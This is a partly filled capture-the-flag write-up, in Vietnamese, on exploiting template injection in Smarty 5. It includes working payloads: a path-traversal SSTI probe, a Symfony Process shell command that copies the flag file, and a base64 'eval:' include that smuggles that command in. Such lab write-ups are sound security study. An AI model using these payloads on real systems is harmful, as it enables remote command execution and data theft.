@@ -1,0 +1,64 @@
+---
+title: untitled-smarty-challenge
+description: ''
+tags:
+  - writeup
+  - ssti
+  - rce
+  - file-upload
+  - command-injection
+  - path-traversal
+category: web
+draft: false
+date: 2023-07-04
+---
+
+import Callout from '@/components/mdx/Callout.astro';
+
+Status: Not started
+
+## Summary
+
+<Callout type="note" title="Note">
+💡
+
+</Callout>
+
+## Description
+
+## Analyst
+
+- Mỗi khi ta gửi lên server một param pages tồn tại thì phía server sẽ tạo ra 1 file trong templates_c bao gồm cả param ta truyền pages
+  ![image.png](/uploads/untitled-smarty-challenge/untitled-smarty-challenge/image.png)
+- Từ đó ý tưởng của ta truyền vào payload ssti mà vẫn đc path valid
+
+```python
+{7*7}/../home
+```
+
+- Giờ ta đã có thể ssti tuy nhiên bài này dùng smary 5 do đó k còn system thêm nữa ở bài này tác giả require cả symfony mà k bt để làm gì
+
+![image.png](/uploads/untitled-smarty-challenge/untitled-smarty-challenge/image-1.png)
+
+- Do đó ta có thể từ symfony để SSTI
+- Đọc qua doc của symfony https://symfony.com/doc/current/components/process.html
+- ta có thể ssti với command như sau:
+
+```python
+{Symfony\Component\Process\Process::fromShellCommandline("cat /flag* > x0n1l.txt")->run()}
+```
+
+- Add vào path thì k được do slash tuy nhiên nếu đọc ở phần template của smarty 5 ta có thể gọi thông qua include file https://smarty-php.github.io/smarty/stable/api/resources/#templates-from-a-specific-directory
+- Từ đó ta có payload như sau :
+
+```python
+{include file="eval:base64:e1N5bWZvbnlcQ29tcG9uZW50XFByb2Nlc3NcUHJvY2Vzczo6ZnJvbVNoZWxsQ29tbWFuZGxpbmUoImNhdCAvZmxhZyogPiB4MG4xbC50eHQiKS0%2BcnVuKCl9"}
+```
+
+- Thành công ghi flag ra file và lấy flag
+
+![image.png](/uploads/untitled-smarty-challenge/untitled-smarty-challenge/image-2.png)
+
+## Exploit
+
+## Result
